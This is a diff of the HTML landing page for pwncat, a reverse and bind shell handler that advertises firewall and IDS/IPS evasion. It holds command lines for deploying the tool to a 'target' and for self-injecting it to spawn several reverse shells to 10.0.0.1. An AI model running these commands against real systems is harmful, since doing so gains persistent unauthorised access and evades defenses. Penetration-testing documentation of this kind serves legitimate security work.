@@ -5,10 +5,9 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="author" content="cytopia">
 	<meta name="description" content="Pwncat - Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python">
-	<meta name="keywords" content="pwncat, reverse shell, bind shell, inject shell, unbreakable reverse shell, UDP reverse shell, pwncat scripting engine, IDS evasion, IPS evasion, Firewall evasion, netcat">
+	<meta name="keywords" content="pwncat, reverse shell handler, reverse shell, bind shell, self-injecting shell, inject shell, unbreakable reverse shell, UDP reverse shell, pwncat scripting engine, IDS evasion, IPS evasion, Firewall evasion, netcat">
 	<title>pwncat - reverse shell, bind shell, inject shell and port forwarding</title>
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mini.css/3.0.1/mini-default.min.css">
-	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60914146-3"></script>
 	<style>
 		html, body {
 			font-size: 1.1rem;
@@ -25,6 +24,7 @@
 		}
 		pre {
 			border: 10px solid black;
+			max-width:900px;
 		}
 		.hover, h1:hover, h2:hover, a:hover, pre:hover, code:hover {
 			color: #00FF00 !important;
@@ -46,7 +46,17 @@
 		marquee.headline.inner {
 			width: 260px;
 		}
-
+		.card {
+			/*background-color: #282a28;*/
+			background-color: #000000;
+			border: 0;
+		}
+		.card>.section.dark {
+			/*--card-back-color: #282a28;*/
+			--card-back-color: #000000;
+			color: #006400;
+			border:0;
+		}
 		@media only screen and (max-width: 1200px) {
 			html, body {
 				font-size: 1.0rem;
@@ -103,7 +113,9 @@
 	</header>
 	<!-- I really suck at HTML. Feel free to PR-fix this :) -->
 	<div class="container">
+
 		<div class="row">
+
 			<label for="drawer-control" class="drawer-toggle"></label>
 			<input type="checkbox" id="drawer-control" class="drawer"/>
 			<div class="cols-sm-12 col-md-2">
@@ -114,6 +126,9 @@
 					<li><span class="icon-edit secondary"></span> <a href="https://github.com/cytopia/pwncat/blob/master/bin/pwncat">src</a></li>
 					<li><span class="icon-help secondary"></span> <a href="https://cytopia.github.io/pwncat/pwncat.api.html">api</a></li>
 					<li><span class="icon-info secondary"></span> <a href="https://cytopia.github.io/pwncat/pwncat.man.html">man</a></li>
+					<li>&nbsp;</li>
+					<li><a target="_blank" href="https://github.com/cytopia/pwncat"><img src="https://img.shields.io/github/stars/cytopia/pwncat?style=social" /></a></li>
+					<li><a href="https://pypi.org/project/pwncat/"><img src="https://img.shields.io/pypi/dm/pwncat?style=social" /></a></li>
 				</ul>
 			</div>
 			<div class="col-sm-12 col-md-10">
@@ -122,130 +137,174 @@
 					<h1 style="font-size:72px;">pwncat</h1>
 				  </marquee>
 				</marquee>
+
+
+				<p><code>pwncat</code> is a sophisticated bind and reverse shell handler with many features as well as a drop-in replacement or complement to <code>netcat</code> and <code>ncat</code>.</p>
+				<br/>
+
+
 				<blockquote cite="github.com/cytopia/pwncat">
 					Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (<a href="https://github.com/cytopia/pwncat/tree/master/pse">PSE</a>).
 				</blockquote>
-				<h2>See in action</h2>
-				<table>
-					<tr>
-						<td data-label="Spawn reverse shell" widht="50%" style="text-align:center;">
-							<a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s">unbreakable reverse shells - how to spawn</a><br/><br/>
-							<a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s"><img src="img/video01.png" /></a>
-						</td>
-						<td data-label="Multiple reverse shells" widht="50%" style="text-align:center;">
-							<a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2">unbreakable reverse shells - multiple shells</a><br/><br/>
-							<a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2"><img src="img/video02.png" /></a>
-						</td>
-					</tr>
-				</table>
-
-				<h2>Features</h2>
-				<table>
-					<thead>
-						<tr>
-							<th>Feature</th>
-							<th>Description</th>
-						</tr>
-					</thead>
-					<tbody>
-						<tr>
-							<td data-label="Feature"><a href="https://github.com/cytopia/pwncat/tree/master/pse">PSE</a></td>
-							<td data-label="Description">Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Self-injecting reverse shell</td>
-							<td data-label="Description">Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Unbreakable reverse shell</td>
-							<td data-label="Description">Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd></td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Bind shell</td>
-							<td data-label="Description">Create normal bind shells for any operating system</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Reverse shell</td>
-							<td data-label="Description">Create normal reverse shells for any operating system</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">UDP Reverse shell</td>
-							<td data-label="Description">Try this with the traditional <code>netcat</code></td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Port forwarding</td>
-							<td data-label="Description">Local and remote port forward (Proxy server/client)</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Detect EGRESS firewalls</td>
-							<td data-label="Description">Scan and report open egress ports on the target (port hopping)</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Evade EGRESS firewalls</td>
-							<td data-label="Description">Evade egress firewalls by round-robin outgoing ports (port hopping)</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Evade IPS</td>
-							<td data-label="Description">Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping)</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">IPv4 / IPv6</td>
-							<td data-label="Description">Dual or single stack IPv4 and IPv6 support</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">TCP / UDP</td>
-							<td data-label="Description">Full TCP and UDP support</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Stateful UDP</td>
-							<td data-label="Description">Stateful connect phase for UDP client mode - allows you to try IPv4 and IPv6 simultaneously and use the first available one on the server</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Compatibility</td>
-							<td data-label="Description">Use the traditional <code>netcat</code> as a client or server together with <code>pwncat</code></td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Python 2 / Python 3</td>
-							<td data-label="Description">Works with Python 2, Python 3, pypy2 and pypy3</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Cross OS</td>
-							<td data-label="Description">Works on Linux, MacOS and Windows as long as Python is available</td>
-						</tr>
-						<tr>
-							<td data-label="Feature">Portable</td>
-							<td data-label="Description">Single file which only uses core packages - no external dependencies required</td>
-						</tr>
-					</tbody>
-				</table>
 				<br/>
 
-				<h2>TL;DR</h2>
-				<h3>Install</h3>
+
+				<h2>Get it</h2>
 				<p>Use <code>pip</code> to install locally</p>
 <pre class="hi">
 pip install pwncat
 </pre>
-				<h3>Deploy to target</h3>
-				<p>Copy base64 data to clipboard from where you have internet access</p>
-<pre class="hi">
-curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
-</pre>
-				<p>Paste it on the target machine</p>
-<pre class="hi">
-echo "&lt;BASE64 STRING&gt;" | base64 -d &gt; pwncat
-chmod +x pwncat
-</pre>
-				<h3>Inject to target</h3>
+				<br/><br/>
+
+				<h2>Inject to target</h2>
 				<p>If you found a vulnerability on the target to start a very simple reverse shell,
 				such as via bash, php, perl, python, nc or similar, you can instruct your local
 				pwncat listener to use this connection to deploy itself on the target automatically
-				and start an additional unbreakable reverse shell back to you.</p>
+				and start four additional unbreakable reverse shells back to you.</p>
 <pre class="hi">
-pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
+pwncat -l 4444 --self-inject /bin/sh:10.0.0.1:4445+3
 </pre>
+				<br/><br/>
 
-				<br/>
+
+				<h2>In Action</h2>
+				<div class="row">
+					<div class="card large">
+						<div class="section dark">
+							<p><a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=1">unbreakable reverse shells - how to spawn</a></p>
+						</div>
+						<a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=1"><img src="img/video01.png" class="section media"/></a>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<p><a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2">unbreakable reverse shells - indefinite shells</a></p>
+						</div>
+						<a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2"><img src="img/video02.png" class="section media"/></a>
+					</div>
+				</div>
+				<br/><br/>
+
+
+				<h2>Features</h2>
+				<div class="row">
+
+					<div class="card large">
+						<div class="section dark">
+							<h4>PSE</h4>
+							<p>Fully Python scriptable with Pwncat Scripting Engine to allow all kinds of stuff on send and receive actions</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Self-injecting reverse shell</h4>
+							<p>Self-injecting mode to deploy itself and auto-start multiple unbreakable reverse shells back to you</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Unbreakable reverse shell</h4>
+							<p>Reverse shell will reconnect to you if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd></p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>UDP reverse shell</h4>
+							<p>This works by adding TCP-like stateful features to it. Try this with the traditional <code>netcat</code></p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Bind shell</h4>
+							<p>Create normal bind shells for any operating system over IPv4, IPv6 or both</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Reverse shell</h4>
+							<p>Create normal reverse shells for any operating system over IPv4, IPV6 or both</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Local port forward</h4>
+							<p>Allows for stable local port forward by acting as a proxy server</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>SSH-less Remote port forward</h4>
+							<p>Allows for stable remote port forward by acting as a double client proxy</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Detect EGRESS firewalls</h4>
+							<p>Scan and report outbound open ports via port hopping connections</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Evade EGRESS firewalls</h4>
+							<p>Evade EGRESS firewalls with outbound round-robin reverse shells</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Evade IDS</h4>
+							<p>Wrap your traffic into any other protocol or self-encrypt it</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Evade IPS</h4>
+							<p>Handle IPS by to choose new target ports on connection loss/cut</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>IPv4 and IPv6</h4>
+							<p>IPv4 and IPv6 dual-stack support - autodetect whatever a server offers</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>TCP and UDP</h4>
+							<p>Any feature is available via both protocols: TCP and UDP</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Stateful UDP</h4>
+							<p>Stateful connect phase for UDP client mode - allows your listener to detect a connecting client.</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>netcat / ncat compatibility</h4>
+							<p>Use <code>netcat</code> or <code>ncat</code> exchangably with <code>pwncat</code> in server or client mode</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>All Python versions supported</h4>
+							<p><code>pwncat</code> works with Python 2,7, 3.5, 3.6, 3.7, 3.8 and even with pypy2 and pypy</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>No libraries required</h4>
+							<p><code>pwncat</code> is written only with Python core libraries to allow it to run without having to install something</p>
+						</div>
+					</div>
+					<div class="card large">
+						<div class="section dark">
+							<h4>Cross OS</h4>
+							<p>Works and is tested on various Linux, MacOS and Windows versions - as long as Python is available</p>
+						</div>
+					</div>
+				</div>
+				<br/><br/>
+
 
 				<h2>Usage</h2>
 				<pre>
